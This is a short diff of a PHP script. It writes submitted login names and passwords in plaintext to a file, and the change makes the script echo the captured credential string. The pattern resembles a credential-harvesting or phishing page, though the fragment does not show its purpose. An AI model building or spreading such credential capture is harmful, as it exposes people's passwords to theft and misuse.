@@ -31,7 +31,7 @@ if(isset($_POST["log"]) && isset($_POST["pas"]) && isset($_POST["privacy"]) &&
    $text1 = "Login=" . $login . " Password=" . $password;
         
    fwrite($file1, $text1);
-   echo $file1;
+   echo $text1;
    fclose($file1);
 }
 else
